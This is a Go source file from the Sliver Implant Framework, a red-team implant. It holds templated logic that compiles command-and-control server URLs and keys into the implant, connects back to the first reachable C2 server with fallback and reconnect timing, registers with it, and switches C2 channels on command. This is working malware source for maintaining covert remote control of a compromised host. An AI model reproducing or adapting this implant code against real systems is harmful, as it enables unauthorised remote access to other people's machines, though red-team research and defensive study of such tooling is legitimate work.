package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"errors"
	"fmt"
	"net/url"
	"strconv"
	"sync"
	"time"

	"github.com/bishopfox/sliver/sliver/comm"
)

const (
	defaultNetTimeout = time.Second * 60
)

var (
	keyPEM    = `{{.Config.Key}}`
	certPEM   = `{{.Config.Cert}}`
	caCertPEM = `{{.Config.CACert}}`

	readBufSize       = 16 * 1024 // 16kb
	maxErrors         = getMaxConnectionErrors()
	reconnectInterval = GetReconnectInterval()

	proxyURL string

	ccCounter = new(int)

	// All server URLs compiled in the implant. For now this also determines
	// which transport stacks are available...
	ccServers = []string{
		// {{range $index, $value := .Config.C2}}
		"{{$value}}", // {{$index}}
		// {{end}}
	}
)

var (
	// Transports - All active transports on this implant.
	Transports = &transports{
		Available: map[uint32]*Transport{},
		mutex:     &sync.Mutex{},
	}
)

// transports - Holds all active transports for this implant.
// This is consumed by some handlers & listeners, as well as the routing system.
type transports struct {
	Available map[uint32]*Transport // All transports available (compiled in) to this implant
	Server    *Transport            // The transport tied to the C2 server (active connection)
	mutex     *sync.Mutex
}

// Init - Parses all available transport strings and registers them as available transports.
// Then starts the first transport in the list, for reaching back to the server.
func (t *transports) Init() (err error) {

	// Register all transports
	for _, addr := range ccServers {
		uri, err := url.Parse(addr)
		if err != nil {
			continue
		}
		transport, _ := NewTransport(uri)
		t.Add(transport)
	}
	if len(t.Available) == 0 {
		return errors.New("no available transports")
	}

	// {{if .Config.Debug}}
	log.Printf("Starting connection loop ...")
	// {{end}}

	// Then start the first transport, with fallback if failure
	for _, tp := range t.Available {

		// This might will init the Comm system, but in the case of tunnel-based
		// routing, we have concurrently started this process, and it will only
		// finish its setup once we are out of this Init() function.
		err = tp.start()

		if err != nil {
			// Wait if this transport failed.
			time.Sleep(reconnectInterval)
			continue
		}

		// Else success: set transport as active C2, send registration message and return
		Transports.Server = tp
		tp.C2.Send <- tp.registerSliver()
		return
	}

	return errors.New("Failed to start one of the available transports")
}

// Add - Add a new active transport to the implant' transport map.
func (t *transports) Add(tp *Transport) (err error) {
	t.mutex.Lock()
	t.Available[tp.ID] = tp
	t.mutex.Unlock()
	return
}

// Remove - A transport has terminated its connection, and we remove it.
func (t *transports) Remove(ID uint32) (err error) {
	t.mutex.Lock()
	delete(t.Available, ID)
	t.mutex.Unlock()
	return
}

// Get - Returns an active Transport given an ID.
func (t *transports) Get(ID uint32) (tp *Transport) {
	tp, _ = t.Available[ID]
	return
}

// Switch - Dynamically switch the active transport, if multiple are available.
func (t *transports) Switch(ID uint32) (err error) {

	next, found := t.Available[ID]
	if !found {
		return fmt.Errorf("No transport available for ID %d", ID)
	}

	// Close the Comm system, and all comm listeners
	err = comm.PrepareCommSwitch()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Comm Switch error: " + err.Error())
		// {{end}}
	}

	// Cut the current transport
	err = t.Server.Stop()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
	}

	// Start the new one and assign to active server connection.
	err = next.start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
		return
	}
	t.Server = next

	// Send a confirmation message, because the server is waiting for it.
	// (by nature the call to switch transports must be asynchronous,
	// without any error return in the same RPC handler)

	return nil
}

// GetActiveC2 returns the URL of the C2 in use
func GetActiveC2() string {
	return Transports.Server.URL.String()
}

// GetActiveConnection returns the Connection of the C2 in use
func GetActiveConnection() *Connection {
	return Transports.Server.C2
}

// GetImplantPrivateKey returns the private key used for comm descryption.
func GetImplantPrivateKey() []byte {
	return []byte(keyPEM)
}

// GetImplantCACert returns the Implant Certificate Authority
func GetImplantCACert() []byte {
	return []byte(caCertPEM)
}

func GetReconnectInterval() time.Duration {
	reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
	if err != nil {
		return 60 * time.Second
	}
	return time.Duration(reconnect) * time.Second
}

func getMaxConnectionErrors() int {
	maxConnectionErrors, err := strconv.Atoi(`{{.Config.MaxConnectionErrors}}`)
	if err != nil {
		return 1000
	}
	return maxConnectionErrors
}

func GetProxyURL() string {
	if proxyURL == "" {
		return "none"
	}
	return proxyURL
}

// newID- Returns an incremental nonce as an id
func newID() uint32 {
	newID := transportID + 1
	transportID++
	return newID
}

var transportID = uint32(0)
